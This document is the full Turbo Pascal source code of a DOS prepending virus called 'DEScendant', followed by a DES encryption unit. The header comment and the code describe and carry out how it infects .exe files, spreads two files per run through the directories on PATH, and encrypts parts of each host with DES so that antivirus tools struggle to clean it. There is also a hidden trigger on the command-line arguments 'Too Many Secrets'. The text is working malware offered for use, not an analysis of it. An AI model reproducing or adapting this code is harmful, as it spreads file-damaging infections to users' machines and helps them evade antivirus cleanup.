{
같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�
겠컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴 Description: 컴컴컴컴컴컴컴컴컴컴컴컴컴컴커�
개                                                                         낡
개       - DEScendant -                                                    낡
개                                                                         낡
개 A prepending virus written in borland turbo pascal 7.0, it encrypts     낡
개 variable blocks of the host file using DES, also storing the key on     낡
개 variable offsets, this should make it very hard for AV scanner to clean 낡
개 this virus. It doesn't infect any "new exe" files.                      낡
개 If an infected program is called with the command line parameters       낡
개 "Too Many Secrets" the virus would put a file called "terces.pot" which 낡
개 stores a with DES encrypted copyright message in the current directory. 낡
개 The virus infects only 2 files per run, after no more files are found   낡
개 in the current directory it changes the directory through the PATH      낡
개 variable.                                                               낡
개                                                                         낡
개 Credits go to the guy who wrote the DES unit :) i don't know his name.  낡
걋컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸�
같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�

                 -- The DESUNIT.PAS is at the bottom --
}

{$M $4000,0,0 }
{$I-}
program _DEScendant_Of_Devil_;
uses crt, dos,windos,desunit;

const
  virussize=11712;

var
  dirinfo:tSearchRec;
  filename:string;
  buffer:array[1..virussize] of char;
  numread,numwritten:word;
  counter:byte;
  attr:word;
  copywrong:string;
  fcrypt: file;
  i:word;
  ende:boolean;

  path:array[1..50] of string[64];
  path_item, current_dir:word;
  self:boolean;
  originaldir,fullname,name:array[0..80] of char;

function findfirstfile:string;
  begin
    findfirst('*.exe',faArchive,dirinfo);
    if doserror = 0 then
      findfirstfile:=dirinfo.name
    else
      findfirstfile:='';
  end;

function findnextfile:string;
  begin
    findnext(dirinfo);
    if doserror = 0 then
      findnextfile:=dirinfo.name
    else
      findnextfile:='';
  end;

function infected(filename:string):boolean;
  var
    fyou:file;
  begin
    assign(fyou,filename);
    reset(fyou,1);
    blockread(fyou,buffer,25,numread);
    close(fyou);
    if numread>=25 then
      begin
        if (buffer[19]='i') or (buffer[25]>=#64) then
          infected:=true
        else
          infected:=false;
      end
    else
      infected:=true;
  end;

procedure crypt(var buffer:array of char; what:boolean);
  var
    key,bufferin,bufferout:array[1..8] of char;
    i,key_begin,cipher_begin:word;
  begin
    case buffer[1] of
      #0..#63: begin
                 key_begin:=10;
                 cipher_begin:=1998;
               end;
      #64..#127: begin
                   key_begin:=4;
                   cipher_begin:=21;
                 end;
      #128..#191: begin
                    key_begin:=1982;
                    cipher_begin:=4;
                  end;
      #192..#255: begin
                    key_begin:=7;
                    cipher_begin:=777;
                  end;
    end;
    for i:=1 to 8 do
      key[i]:=buffer[i+key_begin];
    for i:=1 to 8 do
      bufferin[i]:=buffer[i+cipher_begin];
    des(bufferin[1],bufferout[1],key[1],what);
    for i:=1 to 8 do
      buffer[i+cipher_begin]:=bufferout[i];
  end;

procedure infect(filename:string);
  var
    fyou,fwe,ftemp:file;
    bytes_read:longint;
  begin
    assign(fwe,fullname);
    if self=false then
      begin
        setfattr(fwe,faarchive);
        reset(fwe,1);
        seek(fwe,18);
        buffer[1]:='i';
        blockwrite(fwe,buffer,1);
        self:=true;
      end;
    if infected(filename) = false then
      begin
        assign(fyou,filename);
        setfattr(fyou,faarchive);
        assign(ftemp,'uhczzeku.tmp');
        setfattr(ftemp,faarchive);
        reset(fyou,1);
        reset(fwe,1);
        rewrite(ftemp,1);
        blockread(fwe,buffer,virussize,numread);
        blockwrite(ftemp,buffer,numread,numwritten);
        repeat
          blockread(fyou,buffer,2048,numread);
          if numread=2048 then
            crypt(buffer, true);
          blockwrite(ftemp,buffer,numread,numwritten);
        until (numread = 0) or (numwritten <> numread);
        rewrite(fyou,1);
        reset(ftemp,1);
        repeat
          blockread(ftemp,buffer,2048,numread);
          blockwrite(fyou,buffer,numread,numwritten);
        until (numread = 0) or (numwritten <> numread);
        close(fyou);
        close(ftemp);
        erase(ftemp);
        inc(counter);
      end;
    close(fwe);
  end;

procedure execute_us;
  var
    i:byte;
    fwe,ftemp:file;
    parameter:string;
  begin
    randomize;
    filename:='';
    for i:=1 to 8 do
      filename:=filename+chr(random(26)+ord('a'));
    filename:=filename+'.exe';
    assign(fwe,fullname);
    assign(ftemp,filename);
    setfattr(ftemp,faarchive);
    reset(fwe,1);
    rewrite(ftemp,1);
    seek(fwe,virussize);
    repeat
      blockread(fwe,buffer,2048,numread);
      if numread=2048 then
        crypt(buffer,false);
      blockwrite(ftemp,buffer,numread,numwritten);
    until (numread=0) or (numwritten<>numread);
    close(fwe);
    close(ftemp);
    parameter:='';
    if paramcount>0 then
      for i:=1 to paramcount do
        parameter:=parameter+' '+paramstr(i);
    swapvectors;
    exec(filename,parameter);
    swapvectors;
    setfattr(ftemp,faarchive);
    erase(ftemp);
  end;

procedure changedirectory;
  begin
    if path[current_dir+1]<>'' then
      begin
        inc(current_dir);
        chdir(path[current_dir]);
      end
    else
      ende:=true;
  end;

procedure initpath;
  var
    i,j:word;
    dummy:string;
  begin
    dummy:=getenv('path');
    j:=1;
    for i:=1 to length(dummy) do
      begin
        if dummy[i]=';' then
          begin
            inc(j);
            path[j]:='';
          end
        else
          path[j]:=path[j]+dummy[i];
      end;
  end;

begin
  if (paramcount=3) and (paramstr(1)='Too') and (paramstr(2)='Many') and
     (paramstr(3)='Secrets') then
    begin
      copywrong:=#78+#32+#185+#52+#203+#38+#250+#148+
                 #229+#141+#155+#90+#22+#74+#218+#121+
                 #172+#246+#185+#190+#175+#80+#2+#79+
                 #121+#214+#132+#247+#26+#196+#192+#114;
      assign(fcrypt,'terces.pot');
      rewrite(fcrypt,1);
      blockwrite(fcrypt,copywrong[1],32,numwritten);
      close(fcrypt);
      clrscr;
      textmode(co80);
      textcolor(7);
      gotoxy(33,1); writeln('QRFpraqnag Bs Qrivy,');
      gotoxy(25,5); writeln('jevggra ol FCb5xl va 6443 sbe PO');
      textcolor(7+blink);
      gotoxy(25,12); writeln('*** EXPORT RESTRICTIONS APPLY ***');
      textcolor(7);
      gotoxy(28,20); writeln('uggc://jjj.pbqroernxref.bet');
      halt(0);
    end;
  getcurdir(originaldir,0);
  filename:=paramstr(0);
  for i:=0 to length(filename)-1 do
    name[i]:=filename[i+1];
  name[i+1]:=#0;
  fileexpand(fullname,name);
  self:=false;
  counter:=0;
  ende:=false;
  path_item:=0;
  current_dir:=0;
  initpath;
  filename:=findfirstfile;
  while ende=false do
    begin
      if counter<2 then
        begin
          if (filename='') and (ende=false) then
            changedirectory;
          if ende=false then
            begin
              if filename='' then
                filename:=findfirstfile;
              infect(filename);
              filename:=findnextfile;
            end;
        end
      else
        ende:=true;
    end;
  setcurdir(originaldir);
  execute_us;
end.



---------------------------------DESUNIT.PAS---------------------------------

unit Desunit;

interface



 Procedure DES (Var Input; Var Output; Var Key; Encrypt : Boolean);

 implementation

Procedure DES (Var Input; Var Output; Var Key; Encrypt : Boolean);

Const
  IP : Array [1..64] Of Byte = (58,50,42,34,26,18,10,2,
                                60,52,44,36,28,20,12,4,
                                62,54,46,38,30,22,14,6,
                                64,56,48,40,32,24,16,8,
                                57,49,41,33,25,17, 9,1,
                                59,51,43,35,27,19,11,3,
                                61,53,45,37,29,21,13,5,
                                63,55,47,39,31,23,15,7);
  InvIP : Array [1..64] Of Byte = (40, 8,48,16,56,24,64,32,
                                   39, 7,47,15,55,23,63,31,
                                   38, 6,46,14,54,22,62,30,
                                   37, 5,45,13,53,21,61,29,
                                   36, 4,44,12,52,20,60,28,
                                   35, 3,43,11,51,19,59,27,
                                   34, 2,42,10,50,18,58,26,
                                   33, 1,41, 9,49,17,57,25);
  E : Array [1..48] Of Byte = (32, 1, 2, 3, 4, 5,
                                4, 5, 6, 7, 8, 9,
                                8, 9,10,11,12,13,
                               12,13,14,15,16,17,
                               16,17,18,19,20,21,
                               20,21,22,23,24,25,
                               24,25,26,27,28,29,
                               28,29,30,31,32, 1);
  P : Array [1..32] Of Byte = (16, 7,20,21,
                               29,12,28,17,
                                1,15,23,26,
                                5,18,31,10,
                                2, 8,24,14,
                               32,27, 3, 9,
                               19,13,30, 6,
                               22,11, 4,25);
  SBoxes : Array [1..8,0..3,0..15] Of Byte =
           (((14, 4,13, 1, 2,15,11, 8, 3,10, 6,12, 5, 9, 0, 7),
             ( 0,15, 7, 4,14, 2,13, 1,10, 6,12,11, 9, 5, 3, 8),
             ( 4, 1,14, 8,13, 6, 2,11,15,12, 9, 7, 3,10, 5, 0),
             (15,12, 8, 2, 4, 9, 1, 7, 5,11, 3,14,10, 0, 6,13)),

            ((15, 1, 8,14, 6,11, 3, 4, 9, 7, 2,13,12, 0, 5,10),
             ( 3,13, 4, 7,15, 2, 8,14,12, 0, 1,10, 6, 9,11, 5),
             ( 0,14, 7,11,10, 4,13, 1, 5, 8,12, 6, 9, 3, 2,15),
             (13, 8,10, 1, 3,15, 4, 2,11, 6, 7,12, 0, 5,14, 9)),

            ((10, 0, 9,14, 6, 3,15, 5, 1,13,12, 7,11, 4, 2, 8),
             (13, 7, 0, 9, 3, 4, 6,10, 2, 8, 5,14,12,11,15, 1),
             (13, 6, 4, 9, 8,15, 3, 0,11, 1, 2,12, 5,10,14, 7),
             ( 1,10,13, 0, 6, 9, 8, 7, 4,15,14, 3,11, 5, 2,12)),

            (( 7,13,14, 3, 0, 6, 9,10, 1, 2, 8, 5,11,12, 4,15),
             (13, 8,11, 5, 6,15, 0, 3, 4, 7, 2,12, 1,10,14, 9),
             (10, 6, 9, 0,12,11, 7,13,15, 1, 3,14, 5, 2, 8, 4),
             ( 3,15, 0, 6,10, 1,13, 8, 9, 4, 5,11,12, 7, 2,14)),

            (( 2,12, 4, 1, 7,10,11, 6, 8, 5, 3,15,13, 0,14, 9),
             (14,11, 2,12, 4, 7,13, 1, 5, 0,15,10, 3, 9, 8, 6),
             ( 4, 2, 1,11,10,13, 7, 8,15, 9,12, 5, 6, 3, 0,14),
             (11, 8,12, 7, 1,14, 2,13, 6,15, 0, 9,10, 4, 5, 3)),

            ((12, 1,10,15, 9, 2, 6, 8, 0,13, 3, 4,14, 7, 5,11),
             (10,15, 4, 2, 7,12, 9, 5, 6, 1,13,14, 0,11, 3, 8),
             ( 9,14,15, 5, 2, 8,12, 3, 7, 0, 4,10, 1,13,11, 6),
             ( 4, 3, 2,12, 9, 5,15,10,11,14, 1, 7, 6, 0, 8,13)),

            (( 4,11, 2,14,15, 0, 8,13, 3,12, 9, 7, 5,10, 6, 1),
             (13, 0,11, 7, 4, 9, 1,10,14, 3, 5,12, 2,15, 8, 6),
             ( 1, 4,11,13,12, 3, 7,14,10,15, 6, 8, 0, 5, 9, 2),
             ( 6,11,13, 8, 1, 4,10, 7, 9, 5, 0,15,14, 2, 3,12)),

            ((13, 2, 8, 4, 6,15,11, 1,10, 9, 3,14, 5, 0,12, 7),
             ( 1,15,13, 8,10, 3, 7, 4,12, 5, 6,11, 0,14, 9, 2),
             ( 7,11, 4, 1, 9,12,14, 2, 0, 6,10,13,15, 3, 5, 8),
             ( 2, 1,14, 7, 4,10, 8,13,15,12, 9, 0, 3, 5, 6,11)));

  PC_1 : Array [1..56] Of Byte = (57,49,41,33,25,17, 9,
                                   1,58,50,42,34,26,18,
                                  10, 2,59,51,43,35,27,
                                  19,11, 3,60,52,44,36,
                                  63,55,47,39,31,23,15,
                                   7,62,54,46,38,30,22,
                                  14, 6,61,53,45,37,29,
                                  21,13, 5,28,20,12, 4);

  PC_2 : Array [1..48] Of Byte = (14,17,11,24, 1, 5,
                                   3,28,15, 6,21,10,
                                  23,19,12, 4,26, 8,
                                  16, 7,27,20,13, 2,
                                  41,52,31,37,47,55,
                                  30,40,51,45,33,48,
                                  44,49,39,56,34,53,
                                  46,42,50,36,29,32);

  ShiftTable : Array [1..16] Of Byte = (1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1);

Var
  InputValue : Array [1..64] Of Byte;
  OutputValue : Array [1..64] Of Byte;
  RoundKeys : Array [1..16,1..48] Of Byte;
  L, R, FunctionResult : Array [1..32] Of Byte;
  C, D : Array [1..28] Of Byte;

Function GetBit (Var Data; Index : Byte) : Byte;

Var
  Bits : Array [0..7] Of Byte ABSOLUTE Data;

Begin
  Dec (Index);
  If Bits[Index DIV 8] And (128 SHR (Index MOD 8))>0 then GetBit:=1
    Else GetBit:=0;
End;{GetBit}

Procedure SetBit (Var Data; Index, Value : Byte);

Var
  Bits : Array [0..7] Of Byte ABSOLUTE Data;
  Bit : Byte;

Begin
  Dec (Index);
  Bit:=128 SHR (Index MOD 8);
  Case Value Of
    0 : Bits[Index DIV 8]:=Bits[Index DIV 8] And (Not Bit);
    1 : Bits[Index DIV 8]:=Bits[Index DIV 8] Or Bit;
  End;
End;{SetBit}

Procedure F (Var FR, FK, Output);

Var
  R : Array [1..48] Of Byte ABSOLUTE FR;
  K : Array [1..48] Of Byte ABSOLUTE FK;
  Temp1 : Array [1..48] Of Byte;
  Temp2 : Array [1..32] Of Byte;
  n, h, i, j, Row, Column : Integer;
  TotalOut : Array [1..32] Of Byte ABSOLUTE Output;

Begin
  For n:=1 to 48 Do Temp1[n]:=R[E[n]] Xor K[n];
  For n:=1 to 8 Do Begin
    i:=(n-1)*6;
    j:=(n-1)*4;
    Row:=Temp1[i+1]*2+Temp1[i+6];
    Column:=Temp1[i+2]*8 + Temp1[i+3]*4 + Temp1[i+4]*2 + Temp1[i+5];
    For h:=1 to 4 Do Begin
      Case h Of
        1 : Temp2[j+h]:=(SBoxes[n,Row,Column] And 8) DIV 8;
        2 : Temp2[j+h]:=(SBoxes[n,Row,Column] And 4) DIV 4;
        3 : Temp2[j+h]:=(SBoxes[n,Row,Column] And 2) DIV 2;
        4 : Temp2[j+h]:=(SBoxes[n,Row,Column] And 1);
      End;
    End;
  End;
  For n:=1 to 32 Do TotalOut[n]:=Temp2[P[n]];
End;{F}

Procedure Shift (Var SubKeyPart);

Var
  SKP : Array [1..28] Of Byte ABSOLUTE SubKeyPart;
  n, b : Byte;

Begin
  b:=SKP[1];
  For n:=1 to 27 Do SKP[n]:=SKP[n+1];
  SKP[28]:=b;
End;{Shift}

Procedure SubKey (Round : Byte; Var SubKey);

Var
  SK : Array [1..48] Of Byte ABSOLUTE SubKey;
  n, b : Byte;

Begin
  For n:=1 to ShiftTable[Round] Do Begin
    Shift (C);
    Shift (D);
  End;
  For n:=1 to 48 Do Begin
    b:=PC_2[n];
    If b<=28 then SK[n]:=C[b] Else SK[n]:=D[b-28];
  End;
End;{SubKey}

Var
  n, i, b, Round : Byte;
  Outputje : Array [1..64] Of Byte;
  K : Array [1..48] Of Byte;
  fi : Text;

Begin
  For n:=1 to 64 Do InputValue[n]:=GetBit (Input,n);
  For n:=1 to 28 Do Begin
    C[n]:=GetBit(Key,PC_1[n]);
    D[n]:=GetBit(Key,PC_1[n+28]);
  End;
  For n:=1 to 16 Do SubKey (n,RoundKeys[n]);
  For n:=1 to 64 Do If n<=32 then L[n]:=InputValue[IP[n]]
    Else R[n-32]:=InputValue[IP[n]];
  For Round:=1 to 16 Do Begin
    If Encrypt then
      F (R,RoundKeys[Round],FunctionResult)
    Else
      F (R,RoundKeys[17-Round],FunctionResult);
    For n:=1 to 32 Do FunctionResult[n]:=FunctionResult[n] Xor L[n];
    L:=R;
    R:=FunctionResult;
  End;
  For n:=1 to 64 Do Begin
    b:=InvIP[n];
    If b<=32 then OutputValue[n]:=R[b] Else OutputValue[n]:=L[b-32];
  End;
  For n:=1 to 64 Do SetBit (Output,n,OutputValue[n]);
End;

end.

